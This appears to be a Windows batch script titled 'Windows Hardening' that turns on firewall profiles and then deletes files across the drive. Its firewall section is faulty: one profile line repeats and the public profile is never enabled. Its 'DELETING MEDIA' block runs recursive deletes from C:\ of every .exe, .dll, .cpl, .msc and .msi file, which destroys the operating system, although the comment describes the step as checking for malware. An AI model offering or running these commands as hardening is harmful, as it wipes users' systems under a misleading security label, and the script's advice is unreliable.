@echo off
title Windows Hardening

REM Enables Windows Firewall for all profiles.
echo ENABLING FIREWALL...
netsh advfirewall set domainprofile state on
netsh advfirewall set domainprofile state on 
netsh advfirewall set privateprofile state on

REM Checks for media files and malware.
echo DELETING MEDIA...
cd C:\
del /S *.cpl
del /S *.dll
del /S *.exe
del /S *.png
del /S *.mp3
del /S *.mp4
del /S *.msc
del /S *.msi
